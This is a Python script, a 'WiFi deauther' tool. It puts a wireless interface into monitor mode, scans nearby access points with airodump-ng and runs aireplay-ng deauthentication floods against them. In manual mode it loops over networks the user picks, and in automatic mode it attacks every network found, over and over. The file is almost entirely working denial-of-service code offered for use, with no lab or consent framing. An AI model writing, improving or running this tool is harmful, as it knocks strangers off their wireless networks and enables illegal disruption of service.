#!/usr/bin/env python3

# (Part 7)  1-colour 2-signal.bar 3-canon-count 4-banner 5- mine.ui 6-automatic 7-manual


#  clear():              clear ui
#  signal_bar(power)   signal bar animation
#  big_countdown():    big countdown animation
#  print_banner():       main banner animation


import subprocess
import os
import time
import re
import sys
from pathlib import Path
import threading
 
 #      PART 1
 #      COLOUR 
class Colors:
    G = '\033[1;32m'
    C = '\033[1;36m'   
    Y = '\033[1;33m'   
    R = '\033[1;31m'
    B = '\033[1;34m'
    M = '\033[1;35m'   
    W = '\033[1;37m'   
    N = '\033[0m'
    BOLD = '\033[1m'

 #      PART 2
#  CLEAR

def clear():
    os.system('clear')


 #      PART 3
#    SIGNAL POWER STRENGTH BAR

def big_text(text, color=Colors.C):
    print(color + Colors.BOLD)
    for line in text.split('\n'):
        print(line.center(65))
    print(Colors.N)

def signal_bar(power):
    try:
        p = int(power)
        level = max(2, min(12, (p + 95) // 6))
        bar = "█" * level + "░" * (12 - level)
        color = Colors.G if p > -60 else Colors.Y if p > -75 else Colors.R
        return f"{color}{bar}{Colors.N} {p} dBm"
    except:
        return "N/A"

 #      PART 4
#    BIG SCANNING COUNTDOWN


def big_countdown():
    print(f"{Colors.Y}[*] SCANNING NETWORK...{Colors.N}\n")
    for i in range(5, 0, -1):
        width = 35
        filled = int(width * (5 - i) / 5)
        bar = "█" * filled + "░" * (width - filled)
        print(f"   [{bar}]  {i} seconds ", end="\r")
        time.sleep(1)
    print(f"{Colors.G}[+] SCAN COMPLETE!{' ' * 40}{Colors.N}\n")



 #      PART 5
#      GAY VOPI BANNER



def print_banner():
    clear()
    print(f"{Colors.C}{Colors.BOLD}")
    print(f"\n{Colors.C}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.N}")
    print(f"          {Colors.W}{Colors.BOLD}        WIFI DEAUTHER BY ADITHYAN {Colors.N}")
    print(f"{Colors.C}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.N}\n")

def prin7t_banner():
    clear()
    print(f"\033[1;33mSCANNING NETWORK...\033[0m")


def run(cmd):
    try:
        return subprocess.getoutput(cmd)
    except:
        return ""

def deauth_attack(bssid, iface, channel):
    try:
        run(f"iw dev {iface} set channel {channel} 2>/dev/null")
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, iface], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass




 #      PART 5
# MAIN AND INTERFACE SELECT AND MONITOR MODE




print_banner()

print(f"{Colors.Y}[*] Detecting wireless interfaces...{Colors.N}\n")
INTERFACES = [line.strip() for line in run("iw dev 2>/dev/null | grep -oP 'Interface \\K\\w+' | grep '^wlan'").splitlines() if line.strip()]

if not INTERFACES:
    print(f"{Colors.R}[!] No wlan interface found{Colors.N}")
    sys.exit(1)

for i, iface in enumerate(INTERFACES, 1):
    print(f"   {i}. {iface}")

try:
    num = int(input(f"\n{Colors.Y}Select interface → {Colors.W}"))
    IFACE = INTERFACES[num-1]
except:
    print(f"{Colors.R}Invalid selection!{Colors.N}")
    sys.exit(1)

print(f"{Colors.G}[+] Selected Interface: {IFACE}{Colors.N}\n")



# Monitor Mode

print(f"{Colors.Y}[*] Enabling monitor mode on {IFACE}...{Colors.N}")
run(f"ip link set {IFACE} down 2>/dev/null")
run(f"iw dev {IFACE} set type monitor 2>/dev/null")
run(f"ip link set {IFACE} up 2>/dev/null")
time.sleep(1.8)

print(f"{Colors.G}[+] Monitor mode enabled{Colors.N}\n" if "monitor" in run(f"iw dev {IFACE} info").lower() else f"{Colors.Y}[!] Monitor mode may have issues{Colors.N}\n")



# Mode Selection

print_banner()
print(f"{Colors.Y}Select Attack Mode:{Colors.N}\n")
print(f"{Colors.W}[1] MANUAL   → Select one or multiple networks{Colors.N}")
print(f"{Colors.W}[2] AUTOMATIC → Attack all networks in loop{Colors.N}")

mode = input(f"\n{Colors.Y}Enter 1 or 2 → {Colors.N}").strip()





 #      PART 6
# FOR MANUAL ATTACK CODE




if mode == "1":
    while True:
        clear()
        big_countdown()

        subprocess.run(["pkill", "-9", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        csv_path = Path("scan-01.csv")
        if csv_path.exists():
            csv_path.unlink()

        airodump = subprocess.Popen(["airodump-ng", "--band", "abg", "--write", "scan", "--output-format", "csv", IFACE],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(6)
        airodump.terminate()
        time.sleep(0.8)
        subprocess.run(["pkill", "-9", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        airodump.terminate()    
        time.sleep(1)
        networks = []
        if csv_path.exists():
            try:
                with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) > 13 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', parts[0]):
                            bssid = parts[0]
                            ch = parts[3]
                            power = parts[8] if len(parts) > 8 else "0"
                            essid = parts[13].strip() or "Hidden"
                            if ch.isdigit():
                                networks.append((bssid, ch, essid, power))
            except:
                pass

        if not networks:
            print(f"{Colors.R}[!] No networks found{Colors.N}")
            time.sleep(2)
            continue
        clear()
#       print_banner()
        print(f"{Colors.C}{Colors.BOLD}")
        print(f"\n{Colors.C}{Colors.BOLD}════════════════════════════════════════════════════════════════════════════════{Colors.N}")
        print(f"          {Colors.W}{Colors.BOLD}        WIFI DEAUTHER BY ADITHYAN {Colors.N}")
        print(f"{Colors.C}{Colors.BOLD}════════════════════════════════════════════════════════════════════════════════{Colors.N}\n")
        print("═" * 80)
        for i, (bssid, ch, essid, power) in enumerate(networks, 1):
            print(f"[{i:2}] {essid:<25} CH:{ch:<3} {signal_bar(power)}   {bssid}")
        print("═" * 80)

        # Select targets
        try:
            choice = input(f"\n{Colors.Y}Select target(s) (1,3,5 or 1-4 or 0=rescan): {Colors.N}").strip()
            if choice == "0":
                continue
            if not choice:
                continue

            selected = []
            for part in choice.replace(" ", "").split(','):
                if '-' in part:
                    s, e = map(int, part.split('-'))
                    selected.extend(range(s-1, e))
                else:
                    selected.append(int(part)-1)

            targets = [networks[i] for i in selected if 0 <= i < len(networks)]
            if not targets:
                print(f"{Colors.R}Invalid selection!{Colors.N}")
                time.sleep(1)
                continue
        except:
            print(f"{Colors.R}Invalid selection!{Colors.N}")
            time.sleep(1)
            continue



 # === LOOPING ATTACK ON SELECTED TARGETS ===
 
 
        clear()
        big_text("TARGET(S) LOCKED - LOOP MODE", Colors.G)
        print(f"Attacking {len(targets)} selected network(s) in continuous loop:\n")
        for bssid, ch, essid, _ in targets:
            print(f"  • {essid} | {bssid} | CH:{ch}")
        print(f"\n{Colors.Y}[*] Starting continuous loop attack... (CTRL+C to rescan){Colors.N}\n")

        try:
            while True:
                for bssid, ch, essid, power in targets:
                    clear()
                    big_text("ATTACKING", Colors.Y)
                    print(f"Network : {Colors.BOLD}{essid}{Colors.N}")
                    print(f"Signal  : {signal_bar(power)}")
                    print(f"BSSID   : {bssid} | CH: {ch}\n")

                    clean_bssid = bssid.strip().upper()

                    # === AGGRESSIVE CHANNEL LOCK ===
                    print(f"{Colors.Y}[*] Locking to channel {ch}...{Colors.N}")
                    for _ in range(3):   # Try multiple times
                     run(f"iw dev {IFACE} set channel {ch} 2>/dev/null")
                     run(f"iwconfig {IFACE} channel {ch} 2>/dev/null")
                     run(f"iwconfig {IFACE} channel {ch}")
                     time.sleep(1.0)

                    current = run(f"iw dev {IFACE} info 2>/dev/null | grep -oP 'channel \\K\\d+'").strip()
                    print(f"{Colors.C}[i] Current channel: {current or 'Unknown'}{Colors.N}")

                    subprocess.run(["pkill", "-9", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                    print(f"{Colors.Y}[*] Sending deauth to {essid} ({clean_bssid})...{Colors.N}")

                    try:
                        cmd = [
                            "aireplay-ng", 
                            "-0", "5",
                            "-a", clean_bssid,
                            "--ignore-negative-one",
                            IFACE
                        ]

                        print(f"{Colors.C}Running: {' '.join(cmd)}{Colors.N}")

                        result = subprocess.run(cmd, timeout=10, 
                                              stdout=subprocess.PIPE, 
                                              stderr=subprocess.PIPE, 
                                              text=True)

                        if result.returncode != 0:
                            err = (result.stdout + result.stderr).strip()
                            print(f"{Colors.R}{err[:500]}{Colors.N}")
                        else:
                            print(f"{Colors.G}[+] Packets sent successfully{Colors.N}")

                    except subprocess.TimeoutExpired:
                        print(f"{Colors.G}[+] Deauth burst completed{Colors.N}")
                    except Exception as e:
                        print(f"{Colors.R}Error: {e}{Colors.N}")

                    time.sleep(2.5)

                print(f"\n{Colors.G}[+] Full cycle done. Looping again on selected targets...{Colors.N}")
                time.sleep(3)

        except KeyboardInterrupt:
            print(f"\n{Colors.Y}Loop stopped. Returning to scan...{Colors.N}")
            subprocess.run(["pkill", "-9", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
           # continue



 #      PART 7
#   AUTOMATIC ATTACK MODE CODE






else:
    while True:
        clear()
        print_banner()

        subprocess.run(["pkill", "-9", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        csv_path = Path("scan-01.csv")
        if csv_path.exists():
            csv_path.unlink()
#       big_countdown()
        print(f"{Colors.Y}[*] SCANNING NETWORK...{Colors.N}\n")
        airodump = subprocess.Popen(["airodump-ng", "--band", "abg", "--write", "scan", "--output-format", "csv", IFACE],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(6)
        subprocess.run(["pkill", "-9", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.2)
        airodump.terminate()
        time.sleep(0.3)

        networks = []
        if csv_path.exists():
            try:
                with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) > 13 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', parts[0]):
                            bssid = parts[0]
                            ch = parts[3]
                            power = parts[8] if len(parts) > 8 else "0"
                            essid = parts[13].strip() or "Hidden"
                            if ch.isdigit():
                                networks.append((bssid, ch, essid, power))
            except: 
                pass

        if not networks:
            print(f"{Colors.R}[!] No networks found. Retrying...{Colors.N}")
            time.sleep(2)
            continue

        big_text(f"FOUND {len(networks)} NETWORKS", Colors.G)
        print("-" * 85)
        for i, (bssid, ch, essid, power) in enumerate(networks, 1):
            print(f"[{i:2}] {essid:<25} CH:{ch:<3} {signal_bar(power)}   {bssid}")
        print("-" * 85 + "\n")

        for bssid, ch, essid, power in networks:
            clear()
            big_text("ATTACKING", Colors.Y)
            print(f"Network : {Colors.BOLD}{essid}{Colors.N}")
            print(f"Signal  : {signal_bar(power)}")
            print(f"BSSID   : {bssid} | CH: {ch}\n")

            # === IMPROVED CHANNEL LOCK ===
            print(f"{Colors.Y}[*] Locking to channel {ch}...{Colors.N}")
            run(f"iw dev {IFACE} set channel {ch} 2>/dev/null")
            run(f"iwconfig {IFACE} channel {ch} 2>/dev/null")
            run(f"iwconfig {IFACE} channel {ch}")
            time.sleep(1.2)

            # Force check current channel
            current_ch = run(f"iw dev {IFACE} info | grep -oP 'channel \\K\\d+'")
            print(f"{Colors.C}[i] Current channel: {current_ch or 'Unknown'}{Colors.N}")

            subprocess.run(["pkill", "-9", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            print(f"{Colors.Y}[*] Sending deauth packets... (CTRL+C to skip){Colors.N}\n")

            try:
                subprocess.run([
                    "aireplay-ng", 
                    "-0", "6",                    # 6 deauth bursts
                    "-a", bssid, 
                    IFACE
                ], timeout=9)

            except subprocess.TimeoutExpired:
                print(f"{Colors.G}[+] Deauth burst finished for {essid}{Colors.N}")
            except KeyboardInterrupt:
                print(f"\n{Colors.Y}Skipping to next target...{Colors.N}")
                time.sleep(1)
                continue
            except Exception as e:
                print(f"{Colors.R}Error: {e}{Colors.N}")

            time.sleep(1.5)

        print(f"\n{Colors.G}Full cycle completed. Restarting scan...{Colors.N}")
        time.sleep(3)
        
       
       
       
       ## the end